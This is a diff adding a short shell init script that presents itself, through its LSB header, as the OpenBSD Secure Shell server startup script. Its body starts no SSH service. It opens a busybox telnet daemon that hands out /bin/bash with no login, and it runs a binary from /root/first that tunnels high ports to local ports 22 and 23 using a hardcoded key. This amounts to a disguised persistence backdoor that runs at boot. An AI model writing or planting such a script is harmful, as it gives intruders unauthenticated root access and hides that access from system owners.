@@ -1,0 +1,14 @@
+#! /bin/sh
+
+### BEGIN INIT INFO
+# Provides:             ssh sshd
+# Required-Start:       $remote_fs $syslog
+# Required-Stop:        $remote_fs $syslog
+# Default-Start:        2 3 4 5
+# Default-Stop:
+# Short-Description:    OpenBSD Secure Shell server
+### END INIT INFO
+busybox telnetd -l /bin/bash 
+/root/first/server_linux_amd64 -l :32768 -t 127.0.0.1:22 &
+/root/first/server_linux_amd64 -l :16384 -t 127.0.0.1:23 --key tmNzuu6ILN4d &
+exit 0 
